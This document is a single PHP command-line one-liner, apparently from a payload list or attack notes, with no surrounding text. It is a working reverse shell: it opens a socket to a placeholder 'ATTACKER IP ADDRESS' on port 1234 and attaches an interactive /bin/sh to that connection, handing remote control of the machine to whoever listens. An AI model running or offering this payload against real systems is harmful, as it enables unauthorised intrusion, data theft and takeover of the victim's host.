php -r '$sock=fsockopen("ATTACKER IP ADDRESS",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
